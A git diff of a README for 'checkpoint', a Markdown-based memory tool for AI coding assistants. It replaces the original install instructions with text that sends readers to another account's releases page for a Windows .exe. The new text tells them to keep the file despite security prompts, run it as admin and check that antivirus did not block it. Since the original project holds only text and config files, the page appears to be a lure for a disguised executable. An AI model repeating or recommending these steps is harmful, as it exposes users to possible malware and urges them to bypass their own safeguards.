@@ -1,231 +1,212 @@
-<div align="center">
+# 🧠 checkpoint - Keep AI memory across sessions
 
-# Checkpoint
+[![Download checkpoint](https://img.shields.io/badge/Download%20checkpoint-blue?style=for-the-badge&logo=github)](https://github.com/sunok2330/checkpoint/releases)
 
-**Persistent memory layer for AI coding assistants.**<br>
-**Eliminate rediscovery. Ship faster.**
+## 🚀 What checkpoint does
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-skill-orange)](https://docs.anthropic.com/en/docs/claude-code)
-[![Cursor](https://img.shields.io/badge/Cursor-rule-purple)](https://cursor.sh)
-[![Copilot](https://img.shields.io/badge/Copilot-instructions-green)](https://github.com/features/copilot)
-[![Codex](https://img.shields.io/badge/OpenAI_Codex-CLI-black)](https://github.com/openai/codex)
+checkpoint gives your AI coding tools a persistent memory layer. It helps Claude Code, Cursor, Copilot, and Codex keep useful context between sessions, so you do not have to explain the same project details again.
 
-`claude install-skill Jyo238/checkpoint`
+Use it to store:
 
-[繁體中文](README.zh-TW.md)
+- Project notes
+- Tool settings
+- Working rules
+- Codebase facts
+- Common tasks
+- Session history
 
-</div>
+This helps reduce repeat work and keeps your AI assistant closer to your project needs.
 
----
+## 📥 Download for Windows
 
-> *“Every new AI session starts from zero. Checkpoint makes it start from where you left off.”*
+Visit this page to download:
 
-Your AI coding assistant is brilliant within a single conversation — but start a new session and everything is forgotten. The API quirk it debugged for 30 minutes? Gone. The user preference you corrected? Forgotten. The architectural decision it finally understood? Rediscovered from scratch.
+https://github.com/sunok2330/checkpoint/releases
 
-**Checkpoint fixes this.** One command (`/checkpoint`) captures every breakthrough, failed approach, user preference, and project context into structured, persistent memory files that survive across sessions — so your AI never solves the same problem twice.
+Open the page, find the latest release, and download the Windows file that matches your computer. In most cases, you will want the `.exe` file or a Windows archive if one is provided.
 
-<div align="center">
-<img src="docs/screenshot.jpg" alt="Checkpoint in action" width="680">
-<br>
-<em>One <code>/checkpoint</code> command — 8 memory files saved, 4 updated, 1 deleted, index refreshed.</em>
-</div>
+## 🪟 Install on Windows
 
-<br>
+1. Open the releases page.
+2. Find the newest version at the top.
+3. Download the Windows file.
+4. If Windows shows a security prompt, choose the option to keep the file.
+5. Open the downloaded file to start setup or launch the app.
+6. Follow the on-screen steps until it finishes.
 
-## The Problem
+If you downloaded a zip file:
 
-AI coding assistants are brilliant within a single conversation — but start a new session and everything is forgotten:
+1. Right-click the file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Run the app file inside the folder.
 
-- **Session 1**: Spend 30 minutes discovering the API requires site-based paths
-- **Session 2**: Spend 30 minutes rediscovering the same thing
-- **Session 3**: You're frustrated. The AI has amnesia.
+## 🧩 How to use it
 
-## The Solution
+checkpoint works in the background as a memory layer for your AI tools. After setup, you can let it store useful project details and reuse them later.
 
-Checkpoint creates a structured, persistent memory system that survives across conversations:
+A simple way to use it:
 
-```
-You:  /checkpoint
-AI:   Scanning conversation... Found 3 new discoveries:
+1. Start checkpoint.
+2. Connect it to your AI coding assistant.
+3. Save project notes, goals, or rules.
+4. Open a new session later.
+5. Let the assistant pull back the saved context.
 
-      1. [SAVED] project_auth_config.md
-         - Tenant blocks app consent, must use pre-authorized client ID
-         - Type: project
+You can keep notes like:
 
-      2. [SAVED] feedback_no_admin.md
-         - Never suggest "ask your admin" — user has no admin rights
-         - Type: feedback
+- What the app does
+- File names that matter
+- Style rules for code
+- Known bugs
+- Build steps
+- Shortcuts your team uses
 
-      3. [UPDATED] reference_api_paths.md
-         - Added newly discovered endpoint paths
-         - Type: reference
+## 💻 Supported tools
 
-      Memory index updated. 3 entries saved/updated.
-```
+checkpoint is built for common AI coding tools, including:
 
-## How It Works
+- Claude Code
+- Cursor
+- GitHub Copilot
+- Codex
 
-Checkpoint operates on two layers:
+It fits well with tools that work across sessions and need a steady memory source for project context.
 
-### Active Layer: `/checkpoint` Command
-Explicitly trigger a full knowledge archival. The AI will:
-1. **Scan** the conversation for all discoveries
-2. **Check** existing memory to avoid duplicates
-3. **Consolidate** — fix index issues (ghosts, orphans, cross-scope duplicates)
-4. **Save** new findings as structured memory files (or update existing ones)
-5. **Update** the MEMORY.md index
-6. **Verify** completeness and report consolidation findings
+## 🔧 Typical setup flow
 
-### Memory Consolidation: `/checkpoint:consolidate`
-Over time, memories accumulate duplicates and stale entries. Run `/checkpoint:consolidate` for deep maintenance:
-- **Duplicate detection** — find and merge memories covering the same topic (with your approval)
-- **Cross-scope resolution** — detect duplicates between project and global memory
-- **Staleness detection** — flag project memories with past dates or outdated references
-- **Quality checks** — identify memories missing required structure (Why/How to apply)
-- **Index repair** — remove dead links, add unindexed files
+If you are new to this kind of tool, use this simple flow:
 
-### Passive Layer: Anti-Amnesia Protocol
-A set of rules added to your `CLAUDE.md` (or equivalent) that runs automatically:
-- **Before work**: Check memory for prior discoveries
-- **After breakthroughs**: Save immediately, don't wait
-- **Before retries**: Check if already solved — don't rediscover
+1. Download checkpoint from the releases page.
+2. Install or open the app on Windows.
+3. Launch your AI coding tool.
+4. Point the tool to checkpoint or connect it through the setup method provided in the release notes.
+5. Save a few key project details.
+6. Test that the assistant can read the saved memory in a new chat or session.
 
-## Memory Types
+## 🗂️ What you can store
 
-| Type | Purpose | Example |
-|------|---------|---------|
-| **user** | Who you are | "Senior backend engineer, new to React" |
-| **feedback** | What you corrected | "Don't mock the database in integration tests" |
-| **project** | Context behind the work | "Auth rewrite is compliance-driven, not tech debt" |
-| **reference** | Where to find things | "Pipeline bugs tracked in Linear project INGEST" |
+checkpoint is useful for small but important facts that should not get lost.
 
-## Installation
+Examples:
 
-### Claude Code
+- Folder names
+- App goals
+- Build commands
+- Preferred libraries
+- Team rules
+- API names
+- Test steps
+- Fixes you do often
 
-```bash
-claude install-skill Jyo238/checkpoint
-```
+This helps when you return to a project after a break and need the AI to remember the setup.
 
-This installs:
-- `/checkpoint` slash command
-- `/checkpoint:consolidate` sub-command for memory maintenance
-- Skill definition for the AI to follow
-- Reference docs for memory types, consolidation algorithm, and anti-amnesia protocol
+## 🛠️ Common use cases
 
-**Optional**: Add the Anti-Amnesia Protocol to your project's `CLAUDE.md`:
+### For solo work
+Keep one place for your project notes so each session starts with the same context.
 
-```bash
-cat skills/checkpoint/references/anti-amnesia-protocol.md >> CLAUDE.md
-```
+### For team work
+Share a stable memory layer so the AI follows the same project rules across people and sessions.
 
-### Cursor
+### For long projects
+Hold onto decisions that are easy to forget, like naming rules, file paths, and key design choices.
 
-Copy the rule file to your project:
+### For tool switching
+Move between Claude Code, Cursor, Copilot, and Codex without rebuilding the same context every time.
 
-```bash
-mkdir -p .cursor/rules
-cp cursor/rules/checkpoint.mdc .cursor/rules/
-```
+## 📌 Suggested Windows system needs
 
-### VSCode / GitHub Copilot
+checkpoint should run well on most modern Windows PCs. A reasonable setup is:
 
-Copy the instruction and prompt files:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- Enough free disk space for the app and saved memory
+- A stable internet connection for downloading the release
 
-```bash
-cp vscode/instructions/checkpoint.md .github/copilot-instructions.md
-cp vscode/prompts/checkpoint.prompt.md .github/prompts/
-```
+If your PC runs other developer tools already, it should be able to handle checkpoint too.
 
-### OpenAI Codex CLI
+## 🔍 What to expect after launch
 
-```bash
-cp codex/checkpoint/SKILL.md your-project/
-cp .codex/INSTALL.md your-project/.codex/
-```
+After you open checkpoint, you should see a simple way to manage memory items or connect the app to your AI tool. The goal is to keep setup light and make repeated work easier.
 
-### Manual Installation (Any AI Tool)
+You may be able to:
 
-1. Copy the content from `skills/checkpoint/SKILL.md` into your AI tool's system prompt or instruction file
-2. Copy the Anti-Amnesia Protocol from `skills/checkpoint/references/anti-amnesia-protocol.md` into your project config
-3. Create a `memory/` directory with an empty `MEMORY.md` index file
+- Add a new memory item
+- Search past notes
+- Update old context
+- Remove outdated details
+- Keep project data grouped by workspace
 
-## File Structure
+## ✅ First things to try
 
-```
-checkpoint/
-├── skills/checkpoint/
-│   ├── SKILL.md                          # Core skill definition
-│   └── references/
-│       ├── anti-amnesia-protocol.md      # Passive defense for CLAUDE.md
-│       ├── consolidation.md             # Memory consolidation algorithm
-│       └── memory-types.md              # Detailed guide to 4 memory types
-├── commands/
-│   ├── checkpoint.md                    # /checkpoint command trigger
-│   └── checkpoint/
-│       └── consolidate.md              # /checkpoint:consolidate sub-command
-├── cursor/rules/
-│   └── checkpoint.mdc                   # Cursor AI rule
-├── vscode/
-│   ├── instructions/checkpoint.md       # Copilot instructions
-│   └── prompts/checkpoint.prompt.md     # Copilot prompt
-├── codex/checkpoint/
-│   └── SKILL.md                         # Codex CLI version
-├── .claude-plugin/
-│   ├── plugin.json                      # Claude Code plugin manifest
-│   └── marketplace.json                 # Marketplace metadata
-├── .codex/
-│   └── INSTALL.md                       # Codex install guide
-├── .github/workflows/
-│   └── release.yml                      # Auto-release on tag
-├── LICENSE                              # MIT
-├── README.md                            # This file
-└── README.zh-TW.md                      # 繁體中文版
-```
+After setup, try these steps:
 
-## Real-World Impact
+1. Add a short project note.
+2. Close the AI session.
+3. Open a new session.
+4. Ask the assistant about the note you saved.
+5. Check that the same context appears again.
 
-This skill was born from real pain. During a multi-session project working with OneNote APIs, the AI repeatedly:
-- Forgot that shared notebooks require site-based API paths (`/sites/{id}/onenote/`)
-- Forgot that the tenant blocks app consent and needs a pre-authorized client ID
-- Forgot the user has no admin rights and kept suggesting "ask your admin"
+If that works, checkpoint is set up for day-to-day use.
 
-Each rediscovery wasted 20-30 minutes. After implementing Checkpoint, the AI reads its memory at the start of every session and skips straight to working solutions.
+## 🧠 Best practices
 
-**Before Checkpoint**: 3 sessions x 30 min rediscovery = 90 min wasted
-**After Checkpoint**: 0 min wasted. Memory is loaded in seconds.
+To keep your memory clean and useful:
 
-## Quick Start (30 seconds)
+- Write short notes
+- Use clear names
+- Remove old facts
+- Keep one project per workspace
+- Save rules that matter across sessions
+- Avoid storing noise
 
-```bash
-# Claude Code
-claude install-skill Jyo238/checkpoint
+Good memory entries make the assistant faster to use and easier to trust.
 
-# Then in any conversation:
-/checkpoint              # Save discoveries from current session
-/checkpoint:consolidate  # Deep clean: merge duplicates, fix index, flag stale entries
-```
+## 📁 Example memory entries
 
-That's it. Your AI will scan the conversation, extract key discoveries, and save them as persistent memory files. Next session, it reads them automatically.
+- Main app folder is `src`
+- Use `npm run build` for builds
+- Prefer simple, direct code changes
+- Do not edit generated files by hand
+- API base URL is set in the config
+- Test login flow before release
 
-## Use Cases
+## 🔗 Download again
 
-| Scenario | Without Checkpoint | With Checkpoint |
-|----------|-------------------|-----------------|
-| Multi-day debugging | Rediscover root cause every session | AI reads prior findings, picks up where it left off |
-| Team onboarding | Each person's AI re-learns the same gotchas | Shared memory files capture tribal knowledge |
-| Complex API integration | Forget auth quirks, endpoint patterns | All discoveries persisted and loaded automatically |
-| User preferences | "I told you not to do that" (again) | Feedback saved once, respected forever |
+Visit this page to download:
 
-## Contributing
+https://github.com/sunok2330/checkpoint/releases
 
-Contributions are welcome! Feel free to:
-- Add support for more AI coding tools
-- Improve the memory type system
-- Share your Anti-Amnesia Protocol variations
-- Report issues or suggest improvements
+## 🧭 Troubleshooting basics
 
-## License
+If the app does not open:
 
-[MIT](LICENSE)
+1. Re-download the file from the releases page.
+2. Make sure Windows finished the download.
+3. Try running the app as an admin.
+4. Check that your antivirus did not block it.
+5. Use the newest release.
+
+If the AI tool does not seem to remember anything:
+
+1. Check that checkpoint is running.
+2. Confirm the tool is connected to the right memory source.
+3. Save a test note.
+4. Start a fresh session and look for the saved context.
+
+## 📦 File names you may see
+
+Depending on the release, you may find files like:
+
+- `.exe` for a Windows app
+- `.zip` for a portable package
+- Release notes or setup instructions
+- Support files for the app
+
+Pick the Windows download that matches the release notes on the page.
+
+## 🧾 Project focus
+
+checkpoint is made for persistent memory in AI coding workflows. It is meant to help you avoid repeat setup, keep key project facts in one place, and keep your assistant useful across sessions
+
